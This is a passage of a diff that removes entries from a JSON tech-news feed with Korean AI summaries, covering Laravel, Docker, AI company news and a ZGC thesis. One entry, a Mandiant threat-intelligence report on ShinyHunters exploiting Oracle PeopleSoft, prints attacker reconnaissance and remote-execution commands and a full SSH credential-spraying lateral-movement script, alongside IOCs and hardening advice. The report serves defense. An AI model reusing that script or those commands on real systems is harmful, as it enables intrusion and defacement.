access as soon as possible. Related contentResults from the first Anthropic Public RecordRead moreTCS and Anthropic partner to bring Claude to regulated industriesWe’re announcing a partnership with Tata Consultancy Services (TCS). TCS will provide Claude to 50,000 of its own employees across 56 c",
-    "url": "https://www.anthropic.com/news/fable-mythos-access",
-    "category": "인공지능",
-    "source": "Anthropic News",
-    "author": "Anthropic",
-    "pubDate": "2026-06-11T15:00:00.000Z",
-    "fetchedAt": "2026-06-13T19:19:32.218Z",
-    "tags": [
-      "Anthropic",
-      "Claude",
-      "AI",
-      "LLM"
-    ]
-  },
-  {
-    "id": "https://laravel-news.com/laracon-us-2026-reveals-its-full-speaker-lineup",
-    "title": "Laracon US 2026 Reveals Its Full Speaker Lineup",
-    "summary": "Laracon US 2026 has announced its complete speaker lineup for July 28-29 in Boston, headlined by Taylor Otwell, Aaron Francis, Nuno Maduro, and Kent C. Dodds.\nThe post Laracon US 2026 Reveals Its Full",
-    "aiSummary": "오는 7월 28일부터 29일까지 보스턴에서 개최되는 Laracon US 2026의 전체 연사 라인업이 공개되었습니다. 이번 행사는 Laravel의 창시자인 Taylor Otwell을 비롯하여 Aaron Francis, Nuno Maduro, Kent C. Dodds가 주요 연사로 참여하여 자리를 빛낼 예정입니다.",
-    "cleanContent": "Laracon US 2026 has announced its complete speaker lineup for July 28-29 in Boston, headlined by Taylor Otwell, Aaron Francis, Nuno Maduro, and Kent C. Dodds.\nThe post Laracon US 2026 Reveals Its Full Speaker Lineup appeared first on Laravel News.\nJoin the Laravel Newsletter to get Laravel articles like this directly in your inbox.",
-    "url": "https://laravel-news.com/laracon-us-2026-reveals-its-full-speaker-lineup?utm_medium=feed&utm_source=feedpress.me&utm_campaign=Feed%3A+laravelnews",
-    "category": "백엔드",
-    "source": "Laravel News",
-    "author": "Eric L. Barnes",
-    "pubDate": "Thu, 11 Jun 2026 14:48:54 +0000",
-    "fetchedAt": "2026-06-13T19:19:32.218Z",
-    "tags": [
-      "Laravel",
-      "PHP"
-    ]
-  },
-  {
-    "id": "https://laravel-news.com/the-state-of-php-2026-survey-is-now-open",
-    "title": "The State of PHP 2026 Survey Is Now Open",
-    "summary": "JetBrains and The PHP Foundation have launched the first State of PHP survey, gathering data on how PHP developers work, what tools they use, and where the language should go next.\nThe post The State ",
-    "aiSummary": "JetBrains와 The PHP Foundation이 PHP 개발자들의 업무 환경과 도구 활용 현황, 그리고 향후 언어의 발전 방향을 파악하기 위해 State of PHP 2026 설문 조사를 시작합니다. 이번 설문은 PHP 생태계의 전반적인 동향을 분석하는 첫 번째 프로젝트로, 전 세계 PHP 개발자들의 의견을 수렴하여 언어의 미래를 결정하는 데 활용될 예정입니다. 관심 있는 개발자들은 공식 설문을 통해 관련 데이터 수집에 참여할 수 있습니다.",
-    "cleanContent": "JetBrains and The PHP Foundation have launched the first State of PHP survey, gathering data on how PHP developers work, what tools they use, and where the language should go next.\nThe post The State of PHP 2026 Survey Is Now Open appeared first on Laravel News.\nJoin the Laravel Newsletter to get Laravel articles like this directly in your inbox.",
-    "url": "https://laravel-news.com/the-state-of-php-2026-survey-is-now-open?utm_medium=feed&utm_source=feedpress.me&utm_campaign=Feed%3A+laravelnews",
-    "category": "백엔드",
-    "source": "Laravel News",
-    "author": "Eric L. Barnes",
-    "pubDate": "Thu, 11 Jun 2026 14:21:19 +0000",
-    "fetchedAt": "2026-06-13T19:19:32.218Z",
-    "tags": [
-      "Laravel",
-      "PHP"
-    ]
-  },
-  {
-    "id": "https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-targets-education-sector-oracle-exploit/",
-    "title": "ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit",
-    "summary": "Introduction\nMandiant and Google Threat Intelligence Group (GTIG) have identified an active compromise and extortion campaign attributed to UNC6240 (ShinyHunters) targeting Oracle PeopleSoft applicati",
-    "aiSummary": "Mandiant와 Google Threat Intelligence Group은 UNC6240으로 알려진 위협 행위자 ShinyHunters가 Oracle PeopleSoft의 취약점인 CVE-2026-35273을 악용하여 교육 분야를 중심으로 공격을 감행한 사실을 확인했습니다. CVSS 점수 9.8의 원격 코드 실행 취약점을 이용한 이번 공격은 Oracle의 보안 권고 이전부터 제로데이 형태로 수행되었으며, 주로 고등 교육 기관을 표적으로 삼았습니다.\n\n공격자들은 PSEMHUB 엔드포인트를 통해 침투한 뒤 MeshCentral 원격 관리 도구를 배포하고 정상적인 Microsoft Azure 서비스인 것처럼 위장하여 명령 및 제어 서버를 운영했습니다. 이후 정찰 활동을 통해 시스템 내부 정보를 수집하고 사용자 지정 스크립트를 활용하여 횡적 이동을 시도했으며, 탈취된 데이터는 ShinyHunters의 데이터 유출 사이트에 공개되었습니다.\n\n이번 공격에 대응하기 위해 Oracle PeopleSoft 운영 조직은 외부망에서 PSEMHUB 및 PSIGW 엔드포인트로의 접근을 즉시 차단해야 합니다. 또한 웹 서버의 접근 로그를 분석하여 의심스러운 요청을 확인하고, 시스템 파일 내에 포함된 웹쉘이나 비정상적인 XML 설정 파일이 존재하는지 점검해야 합니다. 추가적으로 외부로 향하는 SMB 트래픽을 모니터링하여 추가적인 공격 시도를 방지할 것을 권장합니다.",
-    "cleanContent": "Introduction\nMandiant and Google Threat Intelligence Group (GTIG) have identified an active compromise and extortion campaign attributed to UNC6240 (ShinyHunters) targeting Oracle PeopleSoft application infrastructure. The activity was observed between May 27, 2026, and June 9, 2026 and is consistent with the exploitation of CVE-2026-35273, a critical remote code execution vulnerability (CVSS 9.8) in the Environment Management component. The exploitation of this vulnerability directly aligns with the observed targeting of Environment Management Hub (PSEMHUB) endpoints. Because this activity predates Oracle's June 10, 2026 advisory, the vulnerability was exploited as a zero-day.\nUpon becoming aware of active scanning and exploitation, we initiated notifications to over 100 global organizations whose IP addresses correlated with potentially vulnerable endpoints. Most of these organizations were based in the United States, and 68 percent operated within the higher education sector. Subsequently, public reports by @nahamike01 on X highlighted open attacker directories on the staging servers, allowing GTIG to perform a detailed triage of the threat actor's operations. \nThe attacker staging environments hosted customized MeshCentral agents masquerading as legitimate cloud endpoints, which they used to run administrative command queries and deploy a custom lateral movement and defacement script, [victim_abbreviation]_fanout.sh. This campaign directly correlates with subsequent data leaks of stolen organization data published on the ShinyHunters Data Leak Site (DLS) on June 9, 2026. \nWe recommend that organizations running Oracle PeopleSoft take the following immediate actions to best defend themselves. Additional remediation and hardening guidance is included later in this post.\n\n\n    aside_block\n    ), ('btn_text', ''), ('href', ''), ('image', None)])]>\n\nThreat Detail & Campaign Overview\nOn June 9 2026, public threat reports highlighted open attacker directories. GTIG triaged five sequential IP addresses: 142.11.200.186, 142.11.200.187, 142.11.200.188, 142.11.200.189, and 142.11.200.190. These systems were hosting Python SimpleHTTP servers on port 8888, exposing directory contents that included staging materials, customized agents, and attacker command histories.\nThe staging infrastructure hosted pre-configured Windows MeshCentral agent binaries disguised as Microsoft Azure services, specifically named meshagent32-azure-ops.exe, meshagent64-azure-ops.exe, and meshagent64-v2.exe. MeshCentral is an open-source remote management server; its agent is software that runs on remote devices to allow for remote management across various operating systems, including Windows, Linux, macOS, and FreeBSD. Static analysis indicates these agents were hardcoded to establish communication with the command and control (C2) server wss://azurenetfiles.net:443/agent.ashx. The domain azurenetfiles.net was chosen to mimic legitimate Microsoft Azure NetApp Files endpoints, a common masquerading tactic. An unconfigured Linux meshagent binary was also staged, suggesting that the threat actors passed parameters dynamically via the command line during deployment.\nGlobal Notification Response Campaign\nPrior to the discovery of the open staging directories, we began an effort to alert over 100 exposed organizations to assist in restricting access to vulnerable endpoints. These organizations are significantly concentrated in the Higher Education sector; 68 percent are academic institutions, including universities and colleges worldwide.\nWhile several organizations successfully blocked the activity or remediated the vulnerabilities, others experienced compromise, resulting in stolen data being published on the ShinyHunters DLS.\nTechnical Analysis & Command History\nThe exposed .bash_history file, which was identical across all five staging hosts, outlines the server configuration and administrative actions. The technical narrative begins with the configuration of the staging environment. On May 27, 2026, at 22:14 UTC, the attackers installed the MeshCentral remote management server (version 1.1.59) to establish their C2 staging environment. Shortly after, at 22:25 UTC, they installed the acme-client npm package to automate the provisioning of Let's Encrypt SSL certificates for the masquerading domain \"azurenetfiles.net\".  The attackers interacted with compromised systems using the MeshCentral command-line interface utility meshctrl.js.\nThe command history shows the threat actors performing targeted reconnaissance within compromised internal networks. They mapped Oracle PeopleSoft configurations by inspecting mount points, checking the process scheduler configuration file psappsrv.cfg, and reading WebLogic server XML configurations (config.xml). The session log ends with the attackers establishing an outbound SSH connection from their staging system to 176.120.22.24, which hosts the public clearnet mirror of the ShinyHunters DLS.\nAn analysis of the exposed command history reveals the key administrative and malicious operations performed by the threat actors on the staging servers (timestamps were not available in every case):\n1. Staging Infrastructure Setup:\nMay 27, 2026, 22:14 UTC: Installed MeshCentral (v1.1.59) and 22:25 UTC: Installed \"acme-client\" to establish the C2 staging environment and automate SSL certificate provisioning for azurenetfiles.net.\nStaged the compiled Windows agent binaries (meshagent32-azure-ops.exe, etc.) designed to communicate back to the C2 address: wss://azurenetfiles.net:443/agent.ashx.\nMay 29, 2026, 18:46 UTC: The attackers checked for the availability of the \"authenticode\" tool on the staging system using the command npm list global authenticode. This command would return any npm package with a name starting in 'authenticode', such as authenticode-sign, used for signing binaries, or authenticode, used for examining metadata on a file.\n2. Targeted Internal Reconnaissance:\nLeveraged the MeshCentral CLI utility meshctrl.js to execute administrative command queries on compromised remote endpoints: hostname; id.\nMapped Oracle PeopleSoft system configurations by inspecting the process scheduler configuration file (psappsrv.cfg) to extract machine names and IP addresses:\n\n\ngrep -hE '\\''^[[:space:]]*Address=|^[[:space:]]*HostName='\\'' /u01/app/psoft/ps_config_homes/csprd/appserv/prcs/psappsrv.cfg 2>/dev/null | head -80\n\n\nAudited network configurations and active mounts on compromised hosts: mount | grep -E \"psoft|ps_config|nfs\".\nMapped internal subnet hosts by querying local hosts tables: cat /etc/hosts | grep -E \"[redacted_victim_string]\".\nInspected WebLogic XML configurations (config.xml) to map internal application servers.\n3. Lateral Movement & Script Propagation:\nWrote the lateral propagation script [victim_abbreviation]_fanout.sh via a heredoc to /tmp on the staging host.\nTriggered the execution of the propagation script on compromised hosts using the MeshCentral command execution feature:\n\n\nnode meshctrl.js RunCommand --loginuser admin --loginpass '[password]' --id '[agent_id]' --run 'bash /tmp/[victim_abbreviation]_fanout.sh'\n\n\nVerified propagation success by running remote checks for the defacement marker file README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT.\n4. Exfiltration & DLS Connection:\nCompressed exfiltrated directories containing stolen data using zstd:\n\n\npv -s \"$(du -sb exfil | awk '{print $1}')\" | zstd -3 -T0 -o exfil.tar.zst\n\n\nConcluded operations by establishing an outbound SSH connection from the staging host to 176.120.22.24, the IP address hosting the public mirror of the ShinyHunters Data Leak Site.\n\n\n\n\n\n\n\n\n  \n    \nFigure 1: ShinyHunters DLS Post showing Peoplesoft victim added June 9, 2026\n\n      \n    \n\n  \n      \nPropagation Script & Lateral Movement\nAs observed in the .bash_history log, the threat actors wrote a propagation script named [victim_abbreviation]_fanout.sh directly to the /tmp directory of the compromised system. This script automates SSH credential spraying against internal hosts by parsing hostnames from the local /etc/hosts file matching a specific naming pattern. The script attempts authentication using a hardcoded list of common administrative and application-specific usernames and passwords.\nUpon establishing a successful SSH session, the script copies a defacement and extortion marker file named README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT into the WebLogic and Process Scheduler directories. This staging and deployment activity directly correlates with the publication of stolen archives on the ShinyHunters DLS on June 9, 2026.\nThe redacted contents of the propagation script [victim_abbreviation]_fanout.sh are as follows:\n\n\nset +e\r\nSRC=\"/u01/app/psoft/ps_config_homes/csprd/webserv/CSPRD02/README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT\"\r\nNAME=\"README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT\"\r\nBASE=\"/u01/app/psoft/ps_config_homes/csprd\"\r\nexport PATH=/usr/bin:/bin\r\n# hosts from /etc/hosts — internal PS nodes only\r\nHOSTS=$(grep -E '[redacted_victim_host_pattern]|csprd[0-9]' /etc/hosts | awk '{print $2}' | grep -v '^#' | sort -u)\r\necho \"HOSTS=$(echo $HOSTS | wc -w)\"\r\nPWDS=\"[redacted_passwords]\"\r\nUSERS=\"[redacted_usernames]\"\r\nOK=0; FAIL=0; SKIP=0\r\nfor h in $HOSTS; do\r\n  echo \"=== $h ===\"\r\n  copied=0\r\n  for u in $USERS; do\r\n    for p in $PWDS; do\r\n      sshpass -p \"$p\" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 -o BatchMode=no $u@$h \"hostname\" >/dev/null 2>&1 && {\r\n        for dest in $BASE/webserv/CSPRD $BASE/webserv/CSPRD02 $BASE/appserv/prcs; do\r\n          sshpass -p \"$p\" ssh -o StrictHostKeyChecking=no $u@$h \"test -d $dest && mkdir -p $dest && cat > $dest/$NAME\" /dev/null && echo \"  OK $dest ($u)\" && OK=$((OK+1)) && copied=1\r\n        done\r\n        break 2\r\n      }\r\n    done\r\n  done\r\n  if [ $copied -eq 0 ]; then\r\n    # try key-based\r\n    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 -o BatchMode=yes $USER@$h \"hostname\" >/dev/null 2>&1 && copied=1 || true\r\n    if [ $copied -eq 0 ]; then echo \"  FAIL ssh\"; FAIL=$((FAIL+1)); fi\r\n  fi\r\ndone\r\n# local paths on this host\r\nfor dest in $BASE/webserv/CSPRD $BASE/webserv/CSPRD02 $BASE/appserv/prcs; do\r\n  if [ -d \"$dest\" ]; then cp -f \"$SRC\" \"$dest/$NAME\" && chmod 644 \"$dest/$NAME\" && echo \"LOCAL OK $dest\"; fi\r\ndone\r\necho SUMMARY ok=$OK fail=$FAIL\r\nfind $BASE -name \"$NAME\" -type f 2>/dev/null\n\n\nRemediation and Hardening\nTo defend against this campaign, we recommend that organizations running Oracle PeopleSoft immediately implement the following security measures:\nNetwork Isolation & WAF Rules\nEndpoint Access Restrictions: If you cannot disable the EMHub Service, immediately block external network access to the sensitive endpoints /PSEMHUB/* (specifically /PSEMHUB/hub) and /PSIGW/HttpListeningConnector at the network perimeter or firewall level. Relying solely on Web Application Firewall (WAF) body-inspection rules is insufficient, as these controls can be bypassed.\nNon-Breaking Action: Restricting these endpoints is considered non-breaking for standard end-user operations. The Environment Management Hub (EMHub) and the Integration Broker Listening Connector are administrative or system-to-system components and are not required for the core user-facing PeopleSoft Internet Architecture (PIA) browser sessions.\nLog & Endpoint Monitoring\nAccess Log Analysis: Audit the PIA WebLogic access logs for HTTP POST requests directed at /PSEMHUB/hub and /PSIGW/HttpListeningConnector originating from external or untrusted source IP addresses.\nSSRF Detection: Analyze requests to /PSIGW/HttpListeningConnector for loopback IP addresses (such as 127.0.0.1, localhost, or ::1) or internal IP ranges passed within request headers or parameters. This is a common method for attackers to perform Server-Side Request Forgery (SSRF) to bypass access controls.\nNetwork Telemetry\nOutbound Port 445 Monitoring: Monitor outbound firewall logs and NetFlow data for outbound SMB traffic (TCP port 445) originating from PeopleSoft hosts to untrusted, external internet destinations. The exploit chain may coerce the system into making outbound connections in an attempt to capture Windows machine-account NetNTLM hashes.\nHost-Level Auditing & Filesystem Checks\nConduct a thorough forensic audit of the web-tier filesystem on PeopleSoft hosts for indicators of compromise:\nWebshell Detection: Scan the WebLogic web application directory /webserv//applications/peoplesoft/PSEMHUB.war/ for any unexpected *.jsp files that are not part of the shipped product.\nUnauthorized Staging: Inspect the staging directory .../PSEMHUB.war/envmetadata/transactions/ for unauthorized folders, files, or binary drops.\nUnexpected Directories: Look for unexpected directories named logs, persistantstorage, or scratchpad under the PSEMHUB directories.\nXMLDecoder Persistence: Check /envmetadata/data/environment/ for recently created or modified .xml files, which may be leveraged by threat actors to execute remote code via XMLDecoder upon application restart.\nIn alignment with Oracle’s security advisory, we consider the implementation of these mitigations to be a high-priority risk reduction measure and strongly recommend immediate action to address the identified exposure. As this vulnerability is remotely exploitable without authentication and may result in remote code execution, organizations must remain on actively supported versions and apply all Critical Patch Updates, Critical Security Patch Updates, and Security Alerts without delay. Review the full Oracle Security Alert Advisory - CVE-2026-35273 for complete details.\nIndicators of Compromise (IOCs)\nTo assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a GTI collection for registered users.\nStaging & C2 Network Indicators\n142.11.200.186\n142.11.200.187\n142.11.200.188\n142.11.200.189\n142.11.200.190\nazurenetfiles.net\nStaging Payloads & Attacker Files\n\n\n\n\n\n\nFile Path / Name\nIndicator Type\nDescription\nValue / Hash (SHA-256)\n.bash_history\nFile Hash\nAttacker command history\n2ab684d93c1553fad87041b4dea97188a97e78589deee2a7bacff905564f3a35\nmeshagent64-azure-ops.exe\nFile Hash\nPre-configured Windows agent\nf02a924c9ff92a8780ce812511341182c6b509d45bc59f3f7b522e37225d24fc\nmeshagent64-v2.exe\nFile Hash\nPre-configured Windows agent\nd83fdb9e53c5ff03c4cb0451ea1bebd79b53f29eadc1e2fa394c7af13a86ce2f\nmeshagent32-azure-ops.exe\nFile Hash\nPre-configured Windows agent\nc7e9332731b06644fc73e0046a2a89eaa59b09f54250e9bd622467187351711f\nmeshagent\nFile Hash\nUnconfigured Linux agent\n68257a6f9ff196179ec03624e849927f26599eb180a7c82e14ef5bc4e93bc309\nREADME-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT\nFilename\nDefacement / extortion marker\nN/A\n[victim_abbreviation]_fanout.sh\nFilename\nPropagation script\nN/A\n\n\n\n\n\n\n\n\n\n\nGoogle Security Operations (SecOps)\nSecOps customers will have access to the following pending-deployment rules. Once fully deployed, these rules will be available under the Mandiant Frontline Threats rule pack:\nOracle PeopleSoft Configuration Inspection\nOracle PeopleSoft Suspicious JSP File Write to PSEMHUB\nSshpass Interactive File Deployment\nData Archiving or Compression via Zstd Utility\nMeshCentral Command Execution via Meshctrl",
-    "url": "https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-targets-education-sector-oracle-exploit/",
-    "category": "클라우드 & 인프라",
-    "source": "Google Cloud Blog",
-    "author": {
-      "$": {
-        "xmlns:author": "http://www.w3.org/2005/Atom"
-      },
-      "name": [
-        "Mandiant "
-      ],
-      "title": [
-        ""
-      ],
-      "department": [
-        ""
-      ],
-      "company": [
-        ""
-      ]
-    },
-    "pubDate": "Thu, 11 Jun 2026 14:00:00 +0000",
-    "fetchedAt": "2026-06-14T10:33:56.852Z",
-    "tags": [
-      "GCP",
-      "Cloud"
-    ]
-  },
-  {
-    "id": "https://www.docker.com/?p=91063",
-    "title": "Docker Hardened Images enhanced vulnerability scanning with Docker and Aikido",
-    "summary": "Aikido now scans Docker Hardened Images (DHI) with built-in VEX support. Vulnerabilities that Docker has verified as non-exploitable drop out of the queue automatically, so developers spend their time",
-    "aiSummary": "Aikido가 Docker Hardened Images에 대한 취약점 스캔 기능을 강화하며 VEX 지원을 새롭게 추가했습니다.\n\nDocker가 악용 가능성이 없다고 검증한 취약점들은 스캔 대기열에서 자동으로 제외됩니다. 이를 통해 개발자들은 불필요한 알림에 에너지를 쏟는 대신 실질적인 위협 요소 해결에 집중할 수 있게 되었습니다.\n\n이번 통합은 보안 점검 과정의 효율성을 크게 높여주며 개발 팀의 생산성을 개선하는 데 기여합니다. 사용자들은 Docker Hardened Images를 활용하여 보다 안전한 소프트웨어 공급망을 구축하고 취약점 관리 과정을 간소화할 수 있습니다.",
-    "cleanContent": "Aikido now scans Docker Hardened Images (DHI) with built-in VEX support. Vulnerabilities that Docker has verified as non-exploitable drop out of the queue automatically, so developers spend their time on findings that actually matter. This post walks through what changed, why it matters, and how users can benefit from the new integration. Why teams are...",
-    "url": "https://www.docker.com/blog/docker-hardened-images-enhanced-vulnerability-scanning-with-docker-and-aikido/",
-    "category": "클라우드 & 인프라",
-    "source": "Docker Blog",
-    "author": "Dan Berezin Stelzer",
-    "pubDate": "Thu, 11 Jun 2026 12:00:00 +0000",
-    "fetchedAt": "2026-06-13T19:19:32.218Z",
-    "tags": [
-      "Docker",
-      "Infra"
-    ]
-  },
-  {
-    "id": "https://laravel-news.com/version-controlled-documentation-inside-your-laravel-app-with-laradocs",
-    "title": "Version-Controlled Documentation Inside Your Laravel App with Laradocs",
-    "summary": "Laradocs turns markdown files committed alongside your code into a served documentation site at /docs, with folder-based navigation, front-matter metadata, and content reuse via variables and macros.\n",
-    "aiSummary": "Laradocs는 Laravel 애플리케이션 내부에 버전 관리된 문서 사이트를 구축할 수 있도록 지원하는 도구입니다. 이 서비스는 코드와 함께 커밋된 마크다운 파일을 기반으로 /docs 경로에 문서 사이트를 자동으로 생성합니다. 주요 기능으로는 폴더 기반의 탐색 구조 제공, 프런트메터 메타데이터 지원, 그리고 변수와 매크로를 활용한 콘텐츠 재사용 기능이 포함되어 있습니다. 이를 통해 개발자는 별도의 플랫폼을 이용하지 않고도 프로젝트 코드와 함께 체계적인 문서를 관리할 수 있습니다.",
-    "cleanContent": "Laradocs turns markdown files committed alongside your code into a served documentation site at /docs, with folder-based navigation, front-matter metadata, and content reuse via variables and macros.\nThe post Version-Controlled Documentation Inside Your Laravel App with Laradocs appeared first on Laravel News.\nJoin the Laravel Newsletter to get Laravel articles like this directly in your inbox.",
-    "url": "https://laravel-news.com/version-controlled-documentation-inside-your-laravel-app-with-laradocs?utm_medium=feed&utm_source=feedpress.me&utm_campaign=Feed%3A+laravelnews",
-    "category": "백엔드",
-    "source": "Laravel News",
-    "author": "Paul Redmond",
-    "pubDate": "Thu, 11 Jun 2026 05:38:46 +0000",
-    "fetchedAt": "2026-06-13T19:19:32.218Z",
-    "tags": [
-      "Laravel",
-      "PHP"
-    ]
-  },
-  {
-    "id": "https://openai.com/index/using-codex-to-simulate-black-holes",
-    "title": "How an astrophysicist uses Codex to help simulate black holes",
-    "summary": "Discover how astrophysicist Chi-kwan Chan uses Codex to build black hole simulations, helping scientists study extreme physics and test Einstein’s theory of general relativity.",
-    "aiSummary": "천체물리학자 Chi-kwan Chan은 블랙홀 시뮬레이션을 구축하는 과정에서 OpenAI의 Codex를 활용하고 있습니다. 이 기술은 복잡한 물리 현상을 수치화하여 연구 효율을 높이는 데 기여합니다. 이를 통해 과학자들은 극한의 물리적 환경을 탐구하고 Einstein의 일반 상대성 이론을 더욱 정밀하게 검증할 수 있게 되었습니다.",
-    "url": "https://openai.com/index/using-codex-to-simulate-black-holes",
-    "category": "인공지능",
-    "source": "OpenAI News",
-    "author": "OpenAI News",
-    "pubDate": "Thu, 11 Jun 2026 00:00:00 GMT",
-    "fetchedAt": "2026-06-14T16:50:23.671Z",
-    "tags": [
-      "OpenAI",
-      "LLM",
-      "AI"
-    ]
-  },
-  {
-    "id": "https://inside.java/2026/06/11/thesis-simplify-weak-reference-processing-zgc/",
-    "title": "Simplifying Weak Reference Processing in ZGC",
-    "summary": "My name is Fredrik, and I recently completed my master's degree in Computer and Information Engineering at Uppsala University. For my thesis I worked with the GC team at Oracle's Stockholm office, inv",
-    "aiSummary": "Uppsala University의 Fredrik이 수행한 연구는 ZGC에서 발생하는 WeakReference 처리 오버헤드를 줄이기 위한 최적화 기법을 다루고 있습니다. 기존 ZGC는 큐 등록 여부와 상관없이 모든 WeakReference를 동일하게 처리하여 대규모 워크로드에서 성능 병목 현상을 유발합니다. 이에 대한 해결책으로 크게 네 가지 메커니즘을 제안합니다.\n\n첫 번째는 Skip-Enqueue Separation으로, 큐 등록이 필요 없는 참조를 별도로 분리하여 ReferenceHandler 스레드 처리를 생략하는 방식입니다. 두 번째는 Dynamic Array를 도입하여 힙에 흩어진 객체 대신 연속적인 배열을 사용함으로써 캐시 지역성을 높이는 방법입니다. 세 번째는 Optimised Clear Path로, 참조 제거 과정에서 불필요한 로드 배리어, 가상 함수 호출, CAS 연산을 최적화하여 처리 속도를 대폭 개선합니다. 마지막으로 네 번째는 Weak Fields로, 객체 형태의 WeakReference 대신 @weak 어노테이션을 필드에 직접 적용하여 WeakReference 객체 자체를 제거하는 근본적인 접근 방식입니다.\n\n연구 결과, 세 가지 파이프라인 최적화를 조합한 clear_path_dyn 방식은 특정 단계에서 81%의 성능 향상을 보였으나 전체 GC 시간 단축에는 한계가 있었습니다. 반면 @weak 어노테이션을 사용하는 방식은 힙 점유율을 53% 줄이고 전체 주요 GC 시간을 최대 41%까지 단축하는 등 압도적인 효율성을 입증했습니다. 결과적으로 이번 연구는 WeakReference 오버헤드가 단순히 처리 파이프라인의 문제가 아니라 언어 차원에서의 표현 방식 문제임을 시사하며, @weak 어노테이션이 Java의 참조 관리 효율성을 높이는 유망한 대안이 될 수 있음을 보여줍니다.",
-    "cleanContent": "My name is Fredrik, and I recently completed my master's degree in Computer and Information Engineering at Uppsala University. For my thesis I worked with the GC team at Oracle's Stockholm office, investigating the overhead of weak reference processing in generational ZGC and whether it could be reduced with targeted modifications to the pipeline — or avoided altogether through a different representation of weak semantics.\n\t\t\t\tThe Problem\n\t\t\t\tJava's WeakReference provides a way to hold a reference to an object without preventing it from being collected. When the GC determines that an object is only weakly reachable, it clears the referent field and, if the reference was registered with a ReferenceQueue, enqueues the reference so the application can react to the collection event. This notification mechanism is optional: the WeakReference constructor accepts a null queue argument, and many uses, e.g. caches, interning maps, listener registrations, never register a queue.\n\t\t\t\tDespite this distinction, ZGC's reference-processing pipeline treats all weak references uniformly. Every discovered reference is linked into an intrusive per-thread linked list via the hidden discovered field, transferred to the ReferenceHandler thread via the pending list, and iterated by that thread regardless of whether it will actually be enqueued. This mismatch between the optional nature of the callback mechanism and the unconditional work performed for it has been noted in the OpenJDK issue tracker (JDK-8029205) but has not yet been addressed in the JDK.\n\t\t\t\tThe per-reference processing cost scales linearly with the number of weak references, making it a bottleneck in workloads that allocate many of them. This thesis investigates whether that cost can be reduced through three orthogonal pipeline modifications, and whether it can be avoided more fundamentally by replacing WeakReference objects with an annotated-field mechanism.\n\t\t\t\tFour Mechanisms\n\t\t\t\t1. Skip-Enqueue Separation (sep)\n\t\t\t\tThe simplest modification routes queue-less weak references to a separate per-worker discovered list during the mark phase. References on this list are processed and cleared by GC threads directly, without ever being added to the pending list or handed to the ReferenceHandler thread. The key change in ZReferenceProcessor is a queue check at discovery time:\n\t\t\t\tif (type == REF_WEAK && !has_reference_queue(ref)) {\n    weak_no_queue_list_per_worker.append(ref);  // bypasses pending list entirely\n} else {\n    discovered_list_per_worker.append(ref);     // normal enqueue pipeline\n}\n\n\t\t\t\t\n\t\t\t\tThe two lists are processed by specialised functions, keeping the no-enqueue path free of per-reference queue checks.\n\t\t\t\t2. Dynamic Array (dyn)\n\t\t\t\tThe intrusive linked list traversed during reference processing exhibits poor cache locality: each element is a WeakReference object scattered across the heap, and following the discovered chain requires loading a new cache line per reference. The dyn mechanism replaces this list with a contiguous ZWeakRefArray allocated on the C heap. References are appended during discovery in O(1) amortised time; during processing the array is iterated sequentially with index-based access, keeping references in L1/L2 cache. The array retains capacity between cycles to avoid reallocations when the reference population is stable.\n\t\t\t\tA secondary benefit is that field data can be pre-loaded during discovery and stored inline in each array entry, enabling the clear path optimisation described next.\n\t\t\t\t3. Optimised Clear Path (clear_path)\n\t\t\t\tThe standard ZGC path for clearing a referent performs three operations: a load barrier to read the referent, a virtual call to determine the reference type, and a CAS via a ZGC barrier to atomically set the field to a coloured null. For queue-less weak references, all three can be simplified:\n\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tLoad barrier eliminated. When combined with dyn, the referent address and value are pre-loaded at discovery time and stored in the array entry. No additional heap loads are needed at processing time.\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tVirtual call eliminated. The reference type is statically known at the call site.\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tCAS replaced with a plain store. The only concurrent application-level operations on a referent field are clearing or enqueueing it (both set it to null), so an atomic CAS can be replaced with a direct store without correctness risk.\n\t\t\t\t\t\n\t\t\t\t\n\t\t\t\tThese three simplifications interact constructively: individually they reduce non-strong processing time by 7% (clear_path_only) and 36% (dyn_only), but together in clear_path_dyn they achieve an 81% reduction — far larger than the sum of their individual contributions. The superadditivity arises because the dynamic array removes the pointer-chasing bottleneck that would otherwise persist when the CAS is eliminated, and the pre-loaded data lets the clear logic run without any barrier overhead.\n\t\t\t\t4. Weak Fields (weak_fields)\n\t\t\t\tThe three pipeline optimisations accelerate the processing of WeakReference's , but the WeakReference objects themselves remain on the heap and must be marked, promoted, and relocated across every GC cycle. The weak_fields mechanism takes a different approach: rather than wrapping a weak pointer in a separate object, weak semantics is expressed directly as a field annotation.\n\t\t\t\t// Instead of:\npublic class Cache {\n    private final WeakReference<Value> entry;\n}\n\n// With the @weak annotation:\npublic class Cache {\n    private @weak Value entry;\n}\n\t\t\t\t\n\t\t\t\tThe @weak annotation is recognised by the class-file parser and stored in fieldInfo metadata. At GC time, ZGC's marking closure checks each reference field against its fieldInfo entry and, if the field is annotated @weak, diverts it to a per-worker ZWeakFieldArray rather than treating it as a strong reference. After marking, weak fields whose referents are unreachable are nulled via a CAS.\n\t\t\t\tBenchmark Design\n\t\t\t\tTwo custom microbenchmarks target the reference-processing pipeline under ZGC:\n\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tSingle-object benchmark. 20 million holder objects each contain either a WeakReference or an @weak field pointing to a single shared target. After a randomised setup (Fisher-Yates shuffle), the strong reference to the target is released and System.gc() is called, concentrating the entire weak-reference load into one GC cycle and maximising non-strong processing time.\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tMulti-object benchmark. 2 million objects with variable-size byte-array payloads are paired with holder objects. Strong references are released in five 